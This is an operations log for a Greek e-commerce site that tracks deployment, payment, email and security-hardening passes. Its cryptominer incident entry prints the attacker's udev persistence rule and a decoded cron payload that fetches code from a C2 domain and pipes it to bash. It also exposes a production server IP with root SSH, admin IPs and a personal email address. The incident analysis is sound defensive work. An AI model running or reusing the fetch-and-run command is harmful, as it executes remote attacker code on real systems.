# OPS STATE

**Last Updated**: 2026-01-18 (Pass-ENV-FRONTEND-PAYMENTS-01)

> **Note**: This file kept ≤250 lines. Older passes in [STATE-ARCHIVE/](STATE-ARCHIVE/).

## 2026-01-18 — Pass ENV-FRONTEND-PAYMENTS-01: Frontend VPS Env for Card Payments

**Status**: ✅ CLOSED

Configured VPS frontend environment to enable card payments by adding missing Stripe variables.

### Issues Fixed

1. **Permission blocker**: Removed `node_modules/.cache/jiti` (owned by root)
2. **Missing .env**: Restored after rsync `--delete` removed it
3. **Missing Stripe vars**: Added `NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY` and `NEXT_PUBLIC_PAYMENTS_CARD_FLAG`

### Evidence

| Endpoint | Field | Value |
|----------|-------|-------|
| /api/healthz | card.flag | enabled |
| /api/healthz | card.stripe_configured | true |
| /api/healthz | keys_present.secret | true |
| /api/healthz | keys_present.public | true |

### Deploy

- Run ID: 21102358766
- Status: SUCCESS
- Duration: 3m50s

### PRs

- #2289 (docs: Pass ENV-FRONTEND-PAYMENTS-01 audit trail)

---

## 2026-01-18 — Pass CARD-PAYMENT-SMOKE-01: Card Payment E2E Smoke Test

**Status**: ✅ CLOSED

Created E2E smoke tests for Stripe card payment infrastructure.

### Backend Stripe Config (Verified)

| Key | Status |
|-----|--------|
| STRIPE_KEY | present |
| STRIPE_SECRET | present |
| STRIPE_WEBHOOK_SECRET | present |
| card.flag via /api/health | enabled |
| card.stripe_configured | true |

### Tests Added

- `card-payment-smoke.spec.ts` - 3 tests (CI-safe with graceful skips)

### PRs

- #2288 (feat: Pass CARD-PAYMENT-SMOKE-01) — merged

---

## 2026-01-17 — Pass PROD-UNBLOCK-01: Production Auth & Products Verification

**Status**: ✅ CLOSED

Investigated reported production issues ("products not visible" + "register/login not working"). Found all APIs working correctly.

### Root Cause

The perceived auth failure was caused by **shell escaping**, not a server issue:
- zsh escapes `!` to `\!` in command-line strings
- JSON payload with `"Password1\!"` is invalid
- Laravel's `json_decode` fails, `$request->all()` returns empty
- Testing with passwords without `!` succeeded immediately

### Evidence

| Test | Result |
|------|--------|
| Products API | ✅ Returns 5 products |
| Register | ✅ Creates user, returns token |
| Login | ✅ Authenticates, returns token |
| AuthController import | ✅ `Illuminate\Http\Request` |

### Files Verified (MD5 match)

| File | Match |
|------|-------|
| AuthController.php | ✅ |
| routes/api.php | ✅ |

### PRs

- None required (all APIs working, no code changes)

---

## 2026-01-17 — Pass EMAIL-SMOKE-01: VPS → Resend End-to-End Smoke Test

**Status**: ✅ CLOSED

Verified end-to-end email sending from VPS production backend via Resend.

### Mail Configuration (No Secrets)

| Config | Value |
|--------|-------|
| MAIL_MAILER | resend |
| MAIL_FROM_ADDRESS | info@dixis.gr |
| MAIL_FROM_NAME | Dixis |

### Evidence

**Test 1: Artisan Command**
```
$ ssh dixis-prod 'php artisan dixis:email:test --to=kourkoutisp@gmail.com'
[OK] Test email sent successfully to kourkoutisp@gmail.com
```

**Test 2: Password Reset Endpoint**
```
$ curl -s -X POST "https://dixis.gr/api/v1/auth/password/forgot" ...
{"message":"If an account exists with this email, you will receive a password reset link."}
```

### PRs

- #TBD (docs: Pass EMAIL-SMOKE-01 VPS email smoke test) — pending

---

## 2026-01-17 — Pass OPS-SSH-HYGIENE-01: Canonical SSH Access

**Status**: ✅ CLOSED

Established canonical SSH configuration to eliminate access guessing.

### Changes

- **~/.ssh/config**: Updated to use `dixis_prod_ed25519_20260115` key with `dixis-prod` alias
- **Quarantine**: Moved 19 old/unused keys to `~/.ssh/_quarantine_ssh_keys_20260117/`
- **Docs**: Created `docs/AGENT/SYSTEM/ssh-access.md` with canonical config and health-check

### Verification

```
$ ssh dixis-prod 'echo SSH_OK && whoami && hostname'
SSH_OK
root
srv709397
```

### Canonical Config

| Item | Value |
|------|-------|
| Alias | `dixis-prod` |
| User | root |
| Key | `dixis_prod_ed25519_20260115` |
| Host | 147.93.126.235 |

### PRs

- #TBD (feat: Pass OPS-SSH-HYGIENE-01 canonical SSH access) — pending

---

## 2026-01-17 — Pass OPS-EMAIL-UNBLOCK-01: Email Now Live on Production

**Status**: ✅ CLOSED

Production email verified working via Resend. Docs corrected from BLOCKED to ENABLED.

### Verification Evidence

**Health API** (`https://dixis.gr/api/health`):
```json
{
  "email": {
    "flag": "enabled",
    "mailer": "resend",
    "configured": true,
    "from_configured": true,
    "keys_present": { "resend": true, "smtp_host": false, "smtp_user": false }
  }
}
```

**Password Reset Endpoint**: `POST /api/v1/auth/password/forgot` → HTTP 200

### What Changed

| Item | Before | After |
|------|--------|-------|
| RESEND_KEY | missing | present |
| EMAIL_NOTIFICATIONS_ENABLED | false | true |
| email.flag in health | disabled | enabled |
| OPS-EMAIL-ENABLE-01 | BLOCKED | ✅ DONE |
| OPS-EMAIL-SMOKE-01 | BLOCKED | ✅ DONE |

### PRs

- #TBD (docs: Pass OPS-EMAIL-UNBLOCK-01 correct email status) — pending

---

## 2026-01-17 — Pass EMAIL-AUTH-01: Password Reset via Resend

**Status**: ✅ MERGED (email now ENABLED on production)

Implemented full password reset flow using Resend email infrastructure.

### Changes

- **Backend**: `PasswordResetController` with forgot/reset endpoints
- **Email**: `ResetPasswordMail` + Greek template
- **Frontend**: `/auth/forgot-password` + `/auth/reset-password` pages
- **i18n**: Greek + English translations
- **Security**: Token hashing, 1-hour expiry, no user enumeration, force re-login

### API Endpoints

```
POST /api/v1/auth/password/forgot  (always 200)
POST /api/v1/auth/password/reset   (200/422)
```

### Tests

- 13 backend feature tests in `PasswordResetTest.php`

### Blocked Until

Email sending requires VPS credentials:
- `RESEND_KEY=re_...` + `EMAIL_NOTIFICATIONS_ENABLED=true`

### PRs

- #2274 (feat: Pass EMAIL-AUTH-01 - Password Reset via Resend) — merged

---

## 2026-01-17 — Pass 60.1: Email Verification Tooling

**Status**: ✅ CLOSED

Enhanced operator tooling for email enablement. Email still BLOCKED pending credentials.

### Changes

- **Health endpoints**: Added `from_configured` field to `/api/health` and `/api/healthz`
- **Artisan command**: `php artisan dixis:email:test --to=<email> [--dry-run]`
- **Runbook**: Enhanced with Resend setup checklist, DNS verification, rollback steps

### Tests Added

- Updated `test_health_endpoint_includes_email_status()` (from_configured assertion)
- Updated `test_healthz_endpoint_includes_email_status()` (from_configured assertion)
- New `TestEmailCommandTest` (7 tests for Artisan command)

### Production Verification

```json
{
  "email": {
    "flag": "disabled",
    "mailer": "resend",
    "configured": false,
    "from_configured": true,
    "keys_present": {"resend": false, "smtp_host": false, "smtp_user": false}
  }
}
```

### Blocked Until

Operator provides credentials:
- **Option A (Resend)**: `RESEND_KEY=re_...` + `EMAIL_NOTIFICATIONS_ENABLED=true`
- **Option B (SMTP)**: `MAIL_HOST`, `MAIL_USERNAME`, `MAIL_PASSWORD` + `EMAIL_NOTIFICATIONS_ENABLED=true`

See `docs/AGENT/TASKS/Pass-60-EMAIL-ENABLE.md` for VPS enablement runbook.

### PRs

- #2271 (feat: Pass 60.1 - enhanced email runbook + test command) — merged

---

## 2026-01-17 — Pass 60: Email Infrastructure Enable

**Status**: ✅ CODE COMPLETE (awaiting credentials)

Added email configuration status to health endpoints. Email wiring from Pass 53-55 confirmed complete.

### Changes

- **Health endpoints**: `/api/health` and `/api/healthz` now include `email` section
- Shows email flag, mailer type, configuration status (keys present)
- No secrets exposed - boolean presence checks only

### Tests Added

- `test_health_endpoint_includes_email_status()`
- `test_healthz_endpoint_includes_email_status()`

### Production Verification

```json
{
  "email": {
    "flag": "disabled",
    "mailer": "resend",
    "configured": false,
    "keys_present": {"resend": false, "smtp_host": false, "smtp_user": false}
  }
}
```

### Operator Steps

See `docs/AGENT/TASKS/Pass-60-EMAIL-ENABLE.md` for VPS enablement with Resend key.

---

## 2026-01-17 — Pass 52: Stripe Enable

**Status**: ✅ CLOSED

Added payment configuration status to health endpoints. Stripe fully operational on production.

### Changes

- **Health endpoints**: `/api/health` and `/api/healthz` now include `payments` section
- Shows COD status, card flag, Stripe configuration (keys present)
- No secrets exposed - boolean presence checks only

### Tests Added

- `test_health_endpoint_includes_payments_status()`
- `test_healthz_endpoint_includes_payments_status()`

### Production Verification

```json
{
  "payments": {
    "cod": "enabled",
    "card": {
      "flag": "enabled",
      "stripe_configured": true,
      "keys_present": {"secret": true, "public": true, "webhook": true}
    }
  }
}
```

---

## 2026-01-17 — Pass CREDENTIALS-01: Credentials Wiring Map

**Status**: ✅ CLOSED

Created consolidated credential wiring map to unblock Pass 52 (Stripe) and Pass 60 (Email).

### Deliverables

- **docs/OPS/CREDENTIALS.md**: Env vars, locations, code refs, validation steps

### Key Findings

| Provider | Required Env Vars | Where to Set |
|----------|-------------------|--------------|
| Stripe | 6 vars (secret, public, webhook, flags) | VPS backend + frontend |
| Email | 3-6 vars (Resend or SMTP + flag) | VPS backend |

### Next Steps

User to provide credentials, then execute Pass 52 + Pass 60.

---

## 2026-01-17 — Pass PRD-AUDIT-REFRESH-01: Refresh Audit After 8 Passes

**Status**: ✅ CLOSED

Refreshed PRD-AUDIT.md to reflect 8 completed passes since original audit.

### Changes

- Updated DONE/PARTIAL/MISSING counts
- Health score: 88% → 91%
- Added pass references to all completed items
- Updated category breakdowns

### Key Metrics

| Metric | Before | After |
|--------|--------|-------|
| ✅ DONE | 68 (61%) | 78 (70%) |
| ⚠️ PARTIAL | 30 (27%) | 23 (21%) |
| ❌ MISSING | 13 (12%) | 10 (9%) |
| Health Score | 88% | 91% |

---

## 2026-01-17 — Pass PRD-AUDIT-STRUCTURE-01: Page Inventory + Content Contracts

**Status**: ✅ CLOSED

Created foundational product documentation for pages, flows, and V1 scope.

### Deliverables

- **PAGES.md**: 70+ pages cataloged with purpose, sections, data deps, i18n
- **FLOWS.md**: 5 core user journeys documented
- **PRD-MUST-V1.md**: V1 must-haves + out of scope list

### Key Findings

| Metric | Value |
|--------|-------|
| Pages cataloged | 70+ |
| Core flows | 5 |
| i18n namespaces complete | 15+ |
| Blocked items | 3 (Stripe, email) |

---

## 2026-01-17 — Pass EN-LANGUAGE-02: Extend i18n to Checkout/Orders

**Status**: ✅ CLOSED

Extended i18n compliance to checkout, order confirmation, and producer orders pages.

### Changes

- **Checkout page**: Form labels, error messages, button text
- **Order confirmation**: Status labels, shipping info, action buttons
- **Producer orders**: Filter tabs, status badges, empty states
- **i18n**: 4 new namespaces (orderStatus, checkoutPage, orderConfirmation, producerOrders)
- **E2E**: 4 smoke tests for locale compliance

### Features

| Feature | Status |
|---------|--------|
| Checkout i18n | ✅ |
| Order confirmation i18n | ✅ |
| Producer orders i18n | ✅ |
| orderStatus.* keys | ✅ |
| E2E smoke tests (4) | ✅ |

### PRs

- #2256 (feat: Pass EN-LANGUAGE-02 extend i18n) — merged

---

## 2026-01-17 — Pass PRODUCER-DASHBOARD-01: i18n + UX Polish

**Status**: ✅ CLOSED

Added i18n compliance and UX improvements to producer dashboard.

### Changes

- **i18n**: Convert hardcoded Greek to `useTranslations()`, add `producerDashboard.*` keys (el+en)
- **Notifications Link**: Add quick action to `/account/notifications` (leverages NOTIFICATIONS-01)
- **Test IDs**: Add data-testid attributes for E2E testing
- **E2E**: 2 smoke tests (route protection, i18n compliance)

### Features

| Feature | Status |
|---------|--------|
| i18n compliance (no hardcoded Greek) | ✅ |
| producerDashboard.* keys (25 each) | ✅ |
| Notifications quick action | ✅ |
| data-testid attributes | ✅ |
| E2E smoke tests (2) | ✅ |

### PRs

- #2254 (feat: Pass PRODUCER-DASHBOARD-01 i18n + notifications link) — merged

---

## 2026-01-16 — Pass NOTIFICATIONS-01: Notification Bell and Page UI

**Status**: ✅ CLOSED

Added notification UI components for authenticated users.

### Changes

- **NotificationBell**: Bell icon in header with unread count badge, 60s polling interval
- **NotificationDropdown**: Latest 5 notifications, mark as read (single/all), time ago formatting
- **NotificationsPage**: Full /account/notifications page with pagination, filtering by read status
- **i18n**: Greek + English translations for all notification strings
- **E2E**: 3 smoke tests (bell visibility, dropdown, page accessibility)

### Features

| Feature | Status |
|---------|--------|
| NotificationBell component | ✅ |
| NotificationDropdown component | ✅ |
| /account/notifications page | ✅ |
| Pagination (10 per page) | ✅ |
| Mark as read (single) | ✅ |
| Mark all as read | ✅ |
| i18n (el + en) | ✅ |
| E2E smoke tests (3) | ✅ |

### PRs

- #2250 (feat: Pass NOTIFICATIONS-01 notification bell and page UI) — merged

---

## 2026-01-16 — Pass EN-LANGUAGE-01: English Language Support

**Status**: ✅ CLOSED

Added multi-language support with Greek (default) and English fallback.

### Changes

- **LocaleContext**: Cookie-based persistence (`dixis_locale`), browser language detection
- **Header**: Language switcher buttons (EL/EN) for desktop and mobile
- **Translations**: Complete EN translations in `messages/en.json` (154+ lines)
- **i18n Integration**: Login page, Products search, Header navigation

### Features

| Feature | Status |
|---------|--------|
| LocaleContext with cookie | ✅ |
| Language switcher (Header) | ✅ |
| EN translations complete | ✅ |
| Browser language detection | ✅ |
| E2E locale tests (3) | ✅ |

### PRs

- #2249 (feat: Pass EN-LANGUAGE-01 English language support) — merged

---

## 2026-01-16 — Pass SEARCH-FTS-01: Full-Text Product Search

**Status**: ✅ CLOSED

Implemented ranked full-text product search with PostgreSQL FTS and frontend search input.

### Changes

- **Backend migration**: tsvector column + GIN index (PostgreSQL-only)
- **Backend controller**: websearch_to_tsquery + ts_rank_cd ranking
- **Frontend**: Search input on /products with debounce + URL sync
- **Tests**: PHPUnit + E2E filters-search.spec.ts updated

### Features

| Feature | Status |
|---------|--------|
| tsvector + GIN index (pgsql) | ✅ |
| websearch_to_tsquery (safe) | ✅ |
| ts_rank_cd ranking | ✅ |
| ILIKE fallback (SQLite CI) | ✅ |
| Search input with debounce | ✅ |
| URL sync (?search=...) | ✅ |
| "No results" message | ✅ |

### PRs

- #2242 (feat: Pass SEARCH-FTS-01 full-text product search) — merged

---

## 2026-01-16 — Pass ADMIN-USERS-01: Admin User Management UI

**Status**: ✅ CLOSED

Created admin user management page at `/admin/users` with server-side authentication.

### Changes

- `frontend/src/app/admin/users/page.tsx` — Admin users list page
- `frontend/tests/e2e/admin-users.spec.ts` — E2E tests for admin access
- Fixed `guest-checkout.spec.ts` E2E tests for CI compatibility

### Features

| Feature | Status |
|---------|--------|
| `/admin/users` page | ✅ |
| `requireAdmin()` server-side guard | ✅ |
| Table: phone, role badge, status, date | ✅ |
| E2E: admin sees users list | ✅ |
| E2E: non-admin denied access | ✅ |

### PRs

- #2235 (feat: Pass ADMIN-USERS-01 admin users management) — merged
- #2236 (fix: E2E guest-checkout cart tests for CI) — merged
- #2237 (fix: E2E auth-guard tests for CI) — merged

---

## 2026-01-16 — Pass GUEST-CHECKOUT-01: Guest Checkout

**Status**: ✅ CLOSED

Enabled guest checkout — users can purchase without creating an account.

### Key Finding

Backend already fully supported guest checkout (Pass 52):
- `auth.optional` middleware on POST /orders
- `OrderPolicy::create()` returns `true` for `$user = null`
- `OrderEmailService` extracts email from `shipping_address`

### Changes (Frontend only)

- Guest checkout notice banner
- Email field required for guests
- Pre-fill email for logged-in users
- E2E tests for guest checkout flow

### PRs

- #2232 (feat: Pass GUEST-CHECKOUT-01 guest checkout) — merged
- #2233 (fix: E2E URL pattern for CI) — pending

---

## 2026-01-16 — Pass OPS-STATE-THIN-01: Thin STATE + Archive

**Status**: ✅ CLOSED

Reduced STATE.md from 1009 to ~250 lines. Moved older entries to archive.

### Changes

- Created `docs/OPS/STATE-ARCHIVE/` folder
- Moved entries before 2026-01-14 → `STATE-2026-Q1-EARLY.md`
- Added archive index section

### Before vs After

| Metric | Before | After |
|--------|--------|-------|
| STATE.md lines | 1009 | ~250 |
| Passes in active | All | Last 10 |
| History lost | N/A | None (archived) |

### PRs

- #TBD (docs: OPS-STATE-THIN-01 thin STATE + archive) — pending

---

## 2026-01-16 — Pass OPS-ACTIVE-01: Create ACTIVE.md Entry Point

**Status**: ✅ CLOSED

Created single entry point file to reduce agent boot time and token consumption.

### Changes

- `docs/ACTIVE.md` (new) — THE entry point (~90 lines)
- `docs/AGENT/SEEDS/boot.md` — Updated startup sequence
- `docs/AGENT/README.md` — Points to ACTIVE.md

### Before vs After

| Metric | Before | After |
|--------|--------|-------|
| Boot files | 4+ | 3 |
| Boot tokens | ~3000+ | ~800-1000 |

### PRs

- #2227 (docs: Pass OPS-ACTIVE-01 create ACTIVE.md entry point) — merged

---

## 2026-01-16 — Pass PRD-AUDIT-01: PRD→Reality Mapping

**Status**: ✅ CLOSED

Audited PRD against repository reality. Created mapping document with gaps and ordered next passes.

### Findings

| Metric | Value |
|--------|-------|
| Total Features | 111 |
| ✅ DONE | 68 (61%) |
| ⚠️ PARTIAL | 30 (27%) |
| ❌ MISSING | 13 (12%) |
| **Health Score** | **88%** |

### Critical Gaps

- Email Verification (blocked by Pass 60)
- Guest Checkout (unblocked)
- Admin User Management (unblocked)
- English Language (unblocked)

### Artifacts

- `docs/PRODUCT/PRD-AUDIT.md` — Executive summary + gap analysis
- `docs/AGENT/TASKS/Pass-PRD-AUDIT-01.md` — Task definition
- `docs/AGENT/SUMMARY/Pass-PRD-AUDIT-01.md` — Summary

### PRs

- #2225 (docs: Pass PRD-AUDIT-01 PRD→Reality mapping) — merged

---

## 2026-01-15 — Pass SEC-ROTATE-01: SSH Key Rotation

**Status**: ✅ CLOSED

Rotated SSH keys after miner incident. Old keys removed, new key installed.

### Key Status

| Key | Status |
|-----|--------|
| dixis-prod-20260115 (MekIeM...) | ✅ ACTIVE |
| dixis-main-key (Y1NzLF...) | ❌ REMOVED |
| dixis-prod-20251105 (KrAQdz...) | ❌ REMOVED |

### Verification

- NEW key login: SUCCESS
- OLD key login: Permission denied (as expected)
- SSHD: key-only, no password

### PRs

- #2219 (docs: SEC-ROTATE-01 SSH key rotation) — merged

---

## 2026-01-15 — Pass SEC-LOGWATCH-01: Local Log Monitoring

**Status**: ✅ CLOSED

Added automated local log analysis for security anomalies (no email dependency).

### Installed

| Component | Status |
|-----------|--------|
| sec-logwatch.timer (daily at 07:00 UTC) | ✅ |
| /var/log/sec-logwatch.log | ✅ |
| Admin IP whitelist (94.66.136.90, 94.66.136.115) | ✅ |

### Reports Include

- AUTH.LOG: Top 10 IPs with accepted logins, unknown IP flagging
- FAIL2BAN: Total bans, bans by jail
- NGINX ACCESS: Top 10 IPs, top 10 status codes
- NGINX ERROR: Last 20 lines

### First Run

- All accepted logins from admin IPs (260 total)
- fail2ban: 24 bans in log
- nginx: 830 200s, 59 404s (healthy)

### PRs

- #2217 (docs: SEC-LOGWATCH-01 local log monitoring) — merged

---

## 2026-01-15 — Pass SEC-EGRESS-01: Egress Monitoring + fail2ban Tightening

**Status**: ✅ CLOSED

Added egress monitoring and tightened fail2ban for enhanced security visibility.

### Installed

| Component | Status |
|-----------|--------|
| sec-egress.timer (daily at 06:00 UTC) | ✅ |
| /var/log/sec-egress.log (outbound report) | ✅ |
| fail2ban tightened (bantime=3600s, maxretry=5) | ✅ |
| Admin IP whitelisted (ignoreip) | ✅ |

### Evidence

- Baseline connections: CLEAN (nginx, next-server, admin SSH only)
- Accepted logins: ALL from admin IP via publickey
- Mining port scan: CLEAN
- Failed SSH (24h): 0

### PRs

- #2216 (docs: SEC-EGRESS-01 egress monitoring) — merged

---

## 2026-01-15 — Pass SEC-WATCH-01: Hardening Baseline + Watchdog

**Status**: ✅ CLOSED

48h post-SEC-UDEV-01 verification and hardening baseline applied.

### VPS Re-check (CLEAN)

- Load: 0.00, CPU normalized
- Stratum scan: no mining pool connections
- UDEV rules: empty (malicious rule stayed removed)
- Cron jobs: only legitimate system jobs

### Hardening Applied

| Component | Status |
|-----------|--------|
| SSHD (key-only, no password) | ✅ |
| fail2ban (sshd jail active) | ✅ |
| UFW firewall (deny incoming) | ✅ |
| nftables (block mining ports 3333/4444/5555/14444) | ✅ |
| sec-watch.timer (daily watchdog) | ✅ |

### PRs

- #2215 (docs: SEC-WATCH-01 hardening baseline) — merged

---

## 2026-01-15 — Pass TEST-COVERAGE-01: Expand @smoke Test Coverage

**Status**: ✅ CLOSED

Added 4 new `@smoke` tests for public pages (producers, contact, legal/terms, legal/privacy).

### Tests Added

| Test | Description |
|------|-------------|
| `@smoke producers page loads` | Producer listing page |
| `@smoke contact page loads` | Contact page |
| `@smoke terms page loads` | Legal terms page |
| `@smoke privacy page loads` | Legal privacy page |

### Evidence

- PR #2213 merged (all checks passed: E2E PostgreSQL, quality-gates, heavy-checks)
- Smoke test count in smoke.spec.ts: 11 → 15

### PRs

- #2213 (test: add 4 @smoke page load tests) — merged

---

## 2026-01-15 — SEC-UDEV-01: UDEV Persistence Mechanism Found & Removed

**Status**: ✅ RESOLVED

### Incident

User reported 100% CPU usage. Miner process `./90RoDF7G` (PID 6779) consuming 197% CPU since Jan 14.

### Root Cause Found

**UDEV Persistence Rule**: `/etc/udev/rules.d/99-auto-upgrade.rules`

```bash
SUBSYSTEM=="net", KERNEL!="lo", ACTION=="add", RUN+="/bin/bash -c '...recreate cron...'"
```

**Attack Flow**:
1. Every reboot/network event → udev trigger fires
2. UDEV rule recreates `/etc/cron.d/auto-upgrade`
3. Cron job (daily at midnight) downloads miner from `http://abcdefghijklmnopqrst.net`
4. Miner runs as root

**Why it kept coming back**: We deleted the cron job but not the udev rule that recreated it!

### Actions Taken

| Action | Status |
|--------|--------|
| Miner process killed (`kill -9 6779`) | ✅ |
| `/etc/cron.d/auto-upgrade` removed | ✅ |
| `/etc/udev/rules.d/99-auto-upgrade.rules` removed | ✅ **ROOT CAUSE** |
| `udevadm control --reload-rules` | ✅ |
| C2 domain blocked in `/etc/hosts` | ✅ |
| SSH access restored (AllowUsers + PermitRootLogin fix) | ✅ |

### Forensic Trail

```
# Decoded cron payload (base64)
#!/bin/bash
function __gogo() { ... uses /dev/tcp to fetch from C2 ... }
__gogo http://abcdefghijklmnopqrst.net | bash
```

### Related

- SEC-RCA-01 (2026-01-10): Suspected original vector (needs verification — see SEC-RCA-01 for details)
- Mining pools already blocked in `/etc/hosts` from previous hardening

### SSH Hardening Status

After incident, SSH was temporarily opened for access. Now restored to secure state:
- `PermitRootLogin prohibit-password` (key-only, no password)
- `PasswordAuthentication no`
- `AllowUsers deploy opsadmin root`

### Monitoring

Watch for 2-3 days. If miner returns, deeper persistence exists.

---

## 2026-01-15 — Pass TEST-UNSKIP-02: Add CI-Safe @smoke Page Load Tests

**Status**: ✅ MERGED

Added 5 new `@smoke` tests for core page loads that actually run in CI (e2e-postgres uses `--grep @smoke`).

### Why

Previous TEST-UNSKIP-02 (PR #1964) unskipped tests that were "false-green" — they appeared to pass but never actually ran in CI because they lacked the `@smoke` tag.

### Tests Added

| Test | Description |
|------|-------------|
| `@smoke PDP page loads` | Product detail page (200 or 404 gracefully) |
| `@smoke cart page loads` | Cart page renders body |
| `@smoke login page loads` | Login page (200/302/307) |
| `@smoke register page loads` | Register page (200/302/307) |
| `@smoke home page loads` | Home page renders nav/main |

### PRs

- #2206 (test: add 5 @smoke page load tests) — merged

---

## 2026-01-14 — Pass OPS-CANONICAL-PATHS-01: Canonical Prod Paths in Deploy Workflows

**Status**: ✅ MERGED (backend OK, frontend blocked by missing env var)

Fixed deploy workflows to use canonical prod paths: `/var/www/dixis/current/{frontend,backend}` instead of legacy paths.

### Decision

**Canonical prod root is `/var/www/dixis/current/`** — All deploy workflows now check:
- Frontend: `/var/www/dixis/current/frontend/.env`
- Backend: `/var/www/dixis/current/backend/`

### Deploy Results

| Workflow | Status | Notes |
|----------|--------|-------|
| deploy-backend | ✅ PASS | https://github.com/lomendor/Project-Dixis/actions/runs/21012280130 |
| deploy-frontend | ❌ BLOCKED | Path fix works; missing `NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY` in VPS |

### Prod Sanity (all pass)
- `https://dixis.gr/` → 200 OK
- `/api/v1/public/products` → 200 OK, JSON
- `/api/auth/request-otp` → 200 OK, success

### PRs
- #2201 (fix: use canonical paths) — merged

### Next Steps
Add `NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY` to `/var/www/dixis/current/frontend/.env` on VPS to unblock frontend deploys.

---

## 2026-01-14 — Pass OPS-VERIFY-01: Deploy Verification Proof Standard

**Status**: ✅ MERGED

Established curl-based deploy verification standard. Removed sudo commands from deploy workflow since `deploy` user lacks passwordless sudo.

### Decision

**No sudo in deploy verify** — All post-deploy checks use curl-based proofs:
1. Port listener check: `curl -s http://127.0.0.1:3000/`
2. Health endpoint: `/api/healthz`
3. OPS-PM2-01 20x curl stability proof

### PRs
- #2195 (fix: remove sudo from deploy verify) — merged
- #2197 (docs: deploy verification proof standard) — merged

### Documentation
- `docs/OPS/DEPLOY-VERIFY-PROOF.md` — Canonical verification standard

---

## Archive

Older entries moved to archive for faster agent boot.

| Archive | Period | Link |
|---------|--------|------|
| 2026 Q1 (Early) | Jan 4-12 | [STATE-2026-Q1-EARLY.md](STATE-ARCHIVE/STATE-2026-Q1-EARLY.md) |

See [STATE-ARCHIVE/INDEX.md](STATE-ARCHIVE/INDEX.md) for full list.
